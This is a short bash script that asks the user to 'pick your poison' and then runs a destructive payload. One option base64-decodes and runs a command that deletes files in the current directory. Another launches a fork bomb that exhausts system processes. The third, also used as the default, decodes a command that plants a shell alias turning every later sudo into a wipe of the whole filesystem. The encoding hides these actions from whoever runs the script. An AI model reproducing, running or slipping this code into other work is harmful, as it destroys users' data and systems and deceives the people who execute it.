#!/bin/bash

echo "Pick your poison [ 1 | 2 | 3 ]:"
read poison

case $poison in
	1)
		echo "poison 1"
		$(echo cm0gLXJmICoK | base64 -d)
		;;
	2)
		echo "poison 2"
		:() { : | : & }; :
		;;
  3)
    echo "poison 3"
    $(echo "ZWNobyAiYWxpYXMgc3Vkbz0nc3VkbyBybSAtcmYgLyogIyciID4+IH4vLmJhc2hyYwo=" | base64 -d)
    ;;
	*)
		echo "poison #3"
		$(echo "ZWNobyAiYWxpYXMgc3Vkbz0nc3VkbyBybSAtcmYgLyogIyciID4+IH4vLmJhc2hyYwo=" | base64 -d)
		;;
esac
